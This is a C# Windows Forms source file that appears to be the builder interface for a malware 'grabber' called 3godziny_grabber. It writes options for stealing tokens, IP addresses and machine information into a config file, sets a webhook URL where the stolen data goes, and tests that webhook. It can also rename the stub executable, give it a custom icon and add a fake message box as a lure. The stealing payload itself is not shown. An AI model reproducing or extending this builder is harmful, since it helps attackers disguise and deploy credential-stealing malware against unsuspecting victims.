using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Media; //please add
using Microsoft.Win32; //please add
using System.Diagnostics; //please add
using System.Runtime.InteropServices;
using System.Net;
using System.IO;
using System.Security.Cryptography;
using System;

namespace _3godziny_grabber
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            tabControl1.Appearance = TabAppearance.FlatButtons;
            tabControl1.ItemSize = new Size(0, 1);
            tabControl1.SizeMode = TabSizeMode.Fixed;
            tabControl1.Visible = false;
            Folder();
            
         
        }

        private void Folder()
        {

        }
        private void plik()
        {

        }
        private void button2_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

     

        private void setup_Click(object sender, EventArgs e)
        {
            tabControl1.SelectedTab = this.tabPage1;
            tabControl1.Visible = true;
        }

        private void grabb_Click(object sender, EventArgs e)
        {
            tabControl1.SelectedTab = this.tabPage2;
            tabControl1.Visible = true;
        }

        private void opcje_Click(object sender, EventArgs e)
        {
            tabControl1.SelectedTab = this.tabPage3;
            tabControl1.Visible = true;
        }

        private void compiler_Click(object sender, EventArgs e)
        {
            tabControl1.SelectedTab = this.tabPage4;
            tabControl1.Visible = true;
        }



        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }
        public static void sendWebHook(string Url, string msg, string Username)
        {
            Http.Post(Url, new System.Collections.Specialized.NameValueCollection()
            {
                {
                    "Test",
                    Username

                },
                {
                    "content",
                    msg
                }

            });
        }

        private void openButton_Click(object sender, EventArgs e)
        {
            //webhook
            
            
        }

        private void button3_Click(object sender, EventArgs e)
        {
            lineChanger("1", @"c:\temp\Grabber_\Config\program.config", 60);

            //msgbox build
            if (Normal.Checked)
            {
                //on
               lineChanger("1", @"c:\temp\Grabber_\Config\program.config", 40);

            }else if (Normal.Checked == false)
            {
                //off
                lineChanger("0", @"c:\temp\Grabber_\Config\program.config", 40);
            }


            if (Error.Checked)
            {
                //on
                lineChanger("1", @"c:\temp\Grabber_\Config\program.config", 41);
            }else if (Normal.Checked == false)
            {
                //off
                lineChanger("0", @"c:\temp\Grabber_\Config\program.config", 41);
            }


            if (quest.Checked)
            {
                //on
                lineChanger("1", @"c:\temp\Grabber_\Config\program.config", 42);
            }else if (quest.Checked == false)
            {
                //off
                lineChanger("0", @"c:\temp\Grabber_\Config\program.config", 42);
            }

            textmsg();

        }
        private void textmsg()
        {
            //title / message
            if(button3.Enabled)
            {
                lineChanger("" + title.Text , @"c:\temp\Grabber_\Config\program.config", 50);
                lineChanger("" + msg.Text, @"c:\temp\Grabber_\Config\program.config", 51);

            }
           
        }

        private void button5_Click(object sender, EventArgs e)
        {
            //msgbox test
            //radio 1
            if (Normal.Checked)
            {
                string message = this.title.Text;
                string title = msg.Text;
                MessageBox.Show(message, title);
            }
            
            //radio 2
            if (Error.Checked)
            {
                MessageBox.Show(msg.Text, title.Text,
                MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
           
            //radio 3
            if (quest.Checked)
            {
                MessageBox.Show(this, title.Text,
                                   msg.Text, MessageBoxButtons.OK,
                                   MessageBoxIcon.Question,
                                   MessageBoxDefaultButton.Button1, 0,
                                   "3",
                                   "Godziny");
            }
            
            
        }
        static void lineChanger(string newText, string fileName, int line_to_edit)
        {
            string[] arrLine = File.ReadAllLines(@"c:\temp\Grabber_\Config\program.config");
            arrLine[line_to_edit - 1] = newText;
            File.WriteAllLines(@"c:\temp\Grabber_\Config\program.config", arrLine);
        }
        private void buildButton_Click(object sender, EventArgs e)
        {
            

            //web
            lineChanger(textBox1.Text, @"c:\temp\Grabber_\Config\program.config", 99);


            if (Token.CheckState == CheckState.Unchecked)
            {
                //off
                lineChanger("0", @"c:\temp\Grabber_\Config\program.config", 1);
              
            }
            else if (Token.CheckState == CheckState.Checked)
            {
                //on
                lineChanger("1", @"c:\temp\Grabber_\Config\program.config", 1);
            }


            if (Info.CheckState == CheckState.Unchecked)
            {
                //off
                lineChanger("0", @"c:\temp\Grabber_\Config\program.config", 2);
            }
            else if (Info.CheckState == CheckState.Checked)
            {
                //on
                lineChanger("1", @"c:\temp\Grabber_\Config\program.config", 2);
            }


            if (qr.CheckState == CheckState.Unchecked)
            {
                //off
                lineChanger("0", @"c:\temp\Grabber_\Config\program.config", 3);
            }
            else if (qr.CheckState == CheckState.Checked)
            {
                //on
                lineChanger("1", @"c:\temp\Grabber_\Config\program.config", 3);
            }


            if (ip.CheckState == CheckState.Unchecked)
            {
                //off
                lineChanger("0", @"c:\temp\Grabber_\Config\program.config", 4);
            }
            else if (ip.CheckState == CheckState.Checked)
            {
                //on
                lineChanger("1", @"c:\temp\Grabber_\Config\program.config", 4);
            }


            if (minfo.CheckState == CheckState.Unchecked)
            {
                //off
                lineChanger("0", @"c:\temp\Grabber_\Config\program.config", 5);
            }
            else if (minfo.CheckState == CheckState.Checked)
            {
                //on
                lineChanger("1", @"c:\temp\Grabber_\Config\program.config", 5);
            }


            if (Mgr.CheckState == CheckState.Unchecked)
            {
                //off
                lineChanger("0", @"c:\temp\Grabber_\Config\program.config", 20);
            }
            else if (minfo.CheckState == CheckState.Checked)
            {
                //on
                lineChanger("1", @"c:\temp\Grabber_\Config\program.config", 20);
            }

            if (Fat.CheckState == CheckState.Unchecked)
            {
                //off
                lineChanger("0", @"c:\temp\Grabber_\Config\program.config", 21);
            }
            else if (Fat.CheckState == CheckState.Checked)
            {
                //on
                lineChanger("1", @"c:\temp\Grabber_\Config\program.config", 21);
            }

            if (Luq.CheckState == CheckState.Unchecked)
            {
                //off
                lineChanger("0", @"c:\temp\Grabber_\Config\program.config", 22);
            }
            else if (Luq.CheckState == CheckState.Checked)
            {
                //on
                lineChanger("1", @"c:\temp\Grabber_\Config\program.config", 22);
            }

            if (start.CheckState == CheckState.Unchecked)
            {
                //off
                lineChanger("0", @"c:\temp\Grabber_\Config\program.config", 23);
            }
            else if (start.CheckState == CheckState.Checked)
            {
                //on
                lineChanger("1", @"c:\temp\Grabber_\Config\program.config", 23);
            }



            Process.Start("explorer.exe", @"c:\temp\Grabber_\Config");






        }

        private void Normal_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void button4_Click(object sender, EventArgs e)
        {
            FileInfo fileInfo = new FileInfo(@"c:\temp\Grabber_\Config\grabber_stub.exe");
            fileInfo.MoveTo(fileInfo.Directory.FullName + "\\" + textBox4.Text + ".exe");
        }

        private void button8_Click(object sender, EventArgs e)
        {
            sendWebHook(textBox1.Text, "3Godziny_Grabber_Test_Grabber", "Test Webhook");
            MessageBox.Show("Test!", "Test Webhook", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }

        private void button6_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog x = new OpenFileDialog())
            {
                x.Filter = "ico file (*.ico)|*.ico";
                if (x.ShowDialog() == DialogResult.OK)
                {
                    textBox5.Text = x.FileName;
                    pictureBox1.ImageLocation = x.FileName;
                    
                }
                else
                {
                   textBox5.Clear();
                }
            }
        }

        private void tabPage4_Click(object sender, EventArgs e)
        {

        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void button7_Click(object sender, EventArgs e)
        {
         
            
               
            
           
            //off
                
                lineChanger("0", @"c:\temp\Grabber_\Config\program.config", 59);
            
        }
    }
}
